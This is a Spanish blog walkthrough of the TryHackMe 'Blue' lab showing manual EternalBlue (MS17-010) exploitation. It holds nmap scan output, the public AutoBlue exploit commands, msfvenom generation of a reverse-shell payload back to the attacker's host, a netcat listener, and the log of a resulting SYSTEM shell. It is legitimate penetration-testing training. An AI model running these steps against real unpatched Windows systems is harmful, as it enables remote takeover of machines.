---
title: EternalBlue - MS17-010 - Manual Exploitation
published: true
---

En esta entrada veremos como explotar de manera manual (GitHub) un Eternal Blue. Para ello he usado la máquina Blue de TryHackMe pero también se podría realizar con la de HackTheBox. No nos centraremos en la resolución de las preguntas que nos plantean ya que la mayoría se contestan al realizar la máquina mediante Metasploit.

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:37 EDT
Initiating SYN Stealth Scan at 13:37
Scanning 10.10.64.35 [65535 ports]
Discovered open port 3389/tcp on 10.10.64.35
Discovered open port 445/tcp on 10.10.64.35
Discovered open port 139/tcp on 10.10.64.35
Discovered open port 135/tcp on 10.10.64.35
Discovered open port 49152/tcp on 10.10.64.35
Discovered open port 49158/tcp on 10.10.64.35
Discovered open port 49153/tcp on 10.10.64.35
Discovered open port 49159/tcp on 10.10.64.35
Discovered open port 49154/tcp on 10.10.64.35
Completed SYN Stealth Scan at 13:37, 13.81s elapsed (65535 total ports)
Nmap scan report for 10.10.64.35
Host is up, received user-set (0.050s latency).
Scanned at 2022-10-28 13:37:46 EDT for 13s
Not shown: 65156 closed tcp ports (reset), 370 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49159/tcp open  unknown       syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
           Raw packets sent: 70436 (3.099MB) | Rcvd: 65185 (2.607MB)
```

Realizaremos un escaneo del puerto 445 ya que sabemos que la máquina va dirigida a Eternal Blue. Nos reporta: 

```bash
❯ nmap -p445 -sCV 10.10.64.35 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:45 EDT
Nmap scan report for 10.10.64.35
Host is up (0.061s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2022-10-28T17:46:01
|_  start_date: 2022-10-28T17:32:02
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:f9:a0:56:45:49 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-28T12:46:01-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
[1]    7547 segmentation fault  nmap -p445 -sCV 10.10.64.35 -oN targeted
```

Esto quiere decir que como estamos bajo a Windows 7 professional. Como el smb está expuesto (puerto 445) tenemos una vía potencial de acceso al sistema.

Con nmap podemos lanzar una serie de scripts, en este caso de la categoria Vuln, a la máquina víctima por el puerto 445:

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 13:49 EDT
Nmap scan report for 10.10.64.35
Host is up (0.051s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
[1]    8466 segmentation fault  nmap -script "vuln" -p445 10.10.64.35
```

Es vulnerable al Eternal Blue. Buscamos un exploit en github sobre la vulnerabilidad. En mi caso voy a utilizar el de <a href="https://github.com/3ndG4me/AutoBlue-MS17-010"> 3ndG4me.</a>

Hacemos un git clone para copiarnos el repositorio a nuestro sistema:

> git clone https://github.com/3ndG4me/AutoBlue-MS17-010

Para comprobar si podemos acceder al sistema mediante Eternal Blue usamos el checker:

```bash
❯ python eternal_checker.py 10.10.64.35
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
=== Testing named pipes ===
[*] Done
```

Como nos conforma que el sistema no está parcheado podemos continuar con el proceso.

En la carpeta shellcode con chmod hacemos que shell_prep.sh sea ejecutable con:

> chmod +x shell_prep.sh 

Lo ejecutamos:

```bash
❯ sudo ./shell_prep.sh
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
10.8.4.179
LPORT you want x64 to listen on:
1234
LPORT you want x86 to listen on:
1234
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.8.4.179 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.8.4.179 LPORT=1234
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE

```

Creamod así sc_all.bin sc_x64.bin y algunos archivos más que podemos ejecutar dependiendo de la arquitectura del sistema Windows del que vamos a obtener acceso.

Ahora debemos usar netcat para estar en escucha por el puerto antes indicado.

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
```

En mi caso es un Windows 7 x64 bits por lo que ejecutaré sc_x64.bin junto con el exploit

```bash
❯ python eternalblue_exploit7.py 10.10.64.35 shellcode/sc_x64.bin
shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```

```bash
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.8.4.179] from (UNKNOWN) [10.10.64.35] 49188
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

Conseguimos acceso al sistema como nt authority\system

Muchas gracias por leer esta publicación, espero que te haya gustado!
